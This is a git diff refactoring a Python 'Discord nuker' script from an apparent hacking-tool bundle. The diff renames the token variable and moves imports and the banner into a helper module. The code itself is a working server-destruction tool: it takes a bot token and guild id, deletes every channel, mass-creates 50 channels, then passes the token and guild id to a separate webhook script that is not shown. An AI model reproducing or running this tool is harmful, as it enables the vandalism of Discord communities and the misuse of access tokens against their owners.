@@ -1,8 +1,5 @@
-import asyncio
-import aiohttp
-from colorama import Fore, Style
-import os
-import ctypes
+from Helper import *
+from Helper.Common.utils import *
 
 def clear():
     os.system("cls" if os.name == "nt" else "clear")
@@ -55,9 +52,9 @@ async def delete_channel(session, channel_id):
             Log.succ(f'Deleted channel' + Fore.MAGENTA + f" {Channel_delted2}" + Fore.RESET)
 
 
-async def delete_channels(session, guild_id, barrer_token):
+async def delete_channels(session, guild_id, token):
     headers = {
-        'Authorization': f'barrer {barrer_token}',
+        'Authorization': f'barrer {token}',
         'Content-Type': 'application/json'
     }
     deleted_count = 0
@@ -80,9 +77,9 @@ async def delete_channels(session, guild_id, barrer_token):
 
 
 
-async def create_channel(guild_id, barrer_token, name):
+async def create_channel(guild_id, token, name):
     headers = {
-        'Authorization': f'barrer {barrer_token}',
+        'Authorization': f'barrer {token}',
         'Content-Type': 'application/json'
     }
     payload = {
@@ -104,7 +101,7 @@ async def create_channel(guild_id, barrer_token, name):
                 return channel_id
 
 
-async def main(barrer_token):
+async def main(token):
     global Channel_created, Channel_delted2
     guild_id = input(lc + " Input Guild/Server id: ")
     name = input(lc + "Enter channel name: ")
@@ -112,38 +109,30 @@ async def main(barrer_token):
 
     tasks = []
     for _ in range(50):
-        tasks.append(create_channel(guild_id, barrer_token, name))
+        tasks.append(create_channel(guild_id, token, name))
 
-    async with aiohttp.ClientSession(headers={'Authorization': f'barrer {barrer_token}'}) as session:
-        deleted_count = await delete_channels(session, guild_id, barrer_token)
+    async with aiohttp.ClientSession(headers={'Authorization': f'{token}'}) as session:
+        deleted_count = await delete_channels(session, guild_id, token)
         created_count = Channel_created
         try:
             await asyncio.gather(*tasks)
         finally:
-            os.system(f"python Helper/Plugs/DiscordNukerPlugs/funcs/webhook.py {barrer_token} {guild_id} {Channel_delted2} {Channel_created} {message}")
+            os.system(f"python Helper/Plugs/DiscordNukerPlugs/funcs/webhook.py {token} {guild_id} {Channel_delted2} {Channel_created} {message}")
 
 
 def Discord_nuker():
     clear()
-    print(Fore.LIGHTMAGENTA_EX + '''
-                    ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗   ████████╗ ██████╗  ██████╗ ██╗     ███████╗
-                    ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
-                    ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗█████╗██║   ██║   ██║██║   ██║██║     ███████╗
-                    ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║╚════╝██║   ██║   ██║██║   ██║██║     ╚════██║
-                    ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
-                    ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
-                                                discord.gg/nexus-tools
-    ''')
+    print(banner)
     print("                                                      " + Fore.RESET + option1 + "Nuke" )
     choice = input(lc + "Enter Choice: ")
     try:
         if choice == '1':
-            barrer_token = input(lc + "Enter barrer Token: ")
-            if not barrer_token:
+            token = input(lc + "Enter Bot Token: ")
+            if not token:
                 print(f"{Fore.RED}No token provided")
                 input()
                 exit()
-            asyncio.run(main(barrer_token))
+            asyncio.run(main(token))
         else:
             print(Fore.RESET +"[" + Fore.RED + "-" + Fore.RESET + "]" + " Invalid choice")
             input(Fore.RESET +"[" + Fore.YELLOW + "-" + Fore.RESET + "]" + " Press any key to go back...")
